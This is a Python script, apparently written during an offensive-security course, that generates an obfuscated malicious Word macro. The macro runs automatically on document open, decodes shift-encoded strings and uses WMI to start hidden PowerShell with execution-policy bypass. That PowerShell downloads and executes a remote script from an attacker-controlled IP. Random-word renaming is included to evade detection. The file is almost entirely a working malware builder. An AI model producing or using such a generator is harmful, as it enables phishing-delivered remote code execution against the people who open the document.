import random

# Define the input strings to be encoded using variables
filename = "runner.doc"
winmgmts = "winmgmts:"
win32_process = "Win32_Process"
cmd = "powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://192.168.x.x/run.txt'))" # change to your IP address

# Define color codes
GREEN = '\033[92m'
RED = '\033[91m'
BLUE = '\033[94m'
YELLOW = '\033[93m'
RESET = '\033[0m'

def banner():
    print(f'''{GREEN}

     _____ _____ _____     _____ _   ___                 _           
    |  |  | __  |  _  |___|     | |_|  _|_ _ ___ ___ ___| |_ ___ ___ 
    |  |  | __ -|     |___|  |  | . |  _| | |_ -|  _| .'|  _| . |  _|
     \\___/|_____|__|__|   |_____|___|_| |___|___|___|__,|_| |___|_|  {RESET}

    Created by {GREEN}eMVee{RESET} and {GREEN}saulgoodman{RESET} during OSEP course

    ''')
banner()

# Generate a random cipher shift value between 1 and 25
cipher_shift = random.randint(1, 25)

# Function to encode a string by shifting its characters
def encode_string(input_string, shift):
    encoded_string = ""
    for char in input_string:
        encoded_char = ord(char) + shift
        encoded_string += f"{encoded_char:03d}"
    return encoded_string

# Encode each input string
encoded_values = {
    "filename": encode_string(filename, cipher_shift),
    "winmgmts": encode_string(winmgmts, cipher_shift),
    "win32_process": encode_string(win32_process, cipher_shift),
    "cmd": encode_string(cmd, cipher_shift)
}

# List of random words to replace in the VBScript
random_words = [
    "Pears", "Beets", "Strawberries", "Grapes", "Jelly", "Almonds",
    "Oatmilk", "Milk", "Nuts", "Water", "Apples", "Tea", "Coffee",
    "Napkin", "Mymacro", "Banana", "Carrot", "Doughnut", "Eggplant",
    "Fig", "Ginger", "Honey", "Iceberg", "Jackfruit", "Kale", "Lemon",
    "Mango", "Nectarine", "Olive", "Papaya", "Quinoa", "Radish",
    "Spinach", "Tomato", "Ugli", "Vanilla", "Watermelon", "Xigua",
    "Yam", "Zucchini"
]

# Function to replace words in the VBScript with random words from the list
def replace_words(script, words_to_replace):
    replacements = {}
    
    # Ensure unique replacements for functions and parameters
    available_words = set(random_words) - set(words_to_replace)
    
    for word in words_to_replace:
        if available_words:
            replacement = random.choice(list(available_words))
            replacements[word] = replacement
            available_words.remove(replacement)
    
    # Replace function names and their calls
    for original, replacement in replacements.items():
        script = script.replace(f"Function {original}(", f"Function {replacement}(")
        script = script.replace(original, replacement)
    
    return script

# List of words to replace in the VBScript
words_to_replace = ["Pears", "Beets", "Strawberries", "Grapes", "Jelly", 
                    "Almonds", "Oatmilk", "Milk", "Nuts", "Water", 
                    "Apples", "Tea", "Coffee", "Napkin", "Mymacro"]

# Generate the VBScript with the encoded values
vbscript = f"""
Function Pears(Beets)
    Pears = Chr(Beets - {cipher_shift})
End Function

Function Strawberries(Grapes)
    Strawberries = Left(Grapes, 3)
End Function

Function Almonds(Jelly)
    Almonds = Right(Jelly, Len(Jelly) - 3)
End Function

Function Nuts(Milk)
    Dim Oatmilk As String
    Oatmilk = ""
    Do
        Oatmilk = Oatmilk + Pears(Strawberries(Milk))
        Milk = Almonds(Milk)
    Loop While Len(Milk) > 0
    Nuts = Oatmilk
End Function

Function Mymacro()
    Dim Apples As String
    Dim Water As String
    If ActiveDocument.Name <> Nuts("{encoded_values['filename']}") Then
        Exit Function
    End If
    Apples = "{encoded_values['cmd']}"
    Water = Nuts(Apples)
    GetObject(Nuts("{encoded_values['winmgmts']}")).Get(Nuts("{encoded_values['win32_process']}")).Create Water, Tea, Coffee, Napkin
End Function

Sub AutoOpen()
    Mymacro
End Sub
"""

# Replace words in the VBScript
vbscript_with_replacements = replace_words(vbscript, words_to_replace)

# Print the generated VBScript with replacements
print(vbscript_with_replacements)
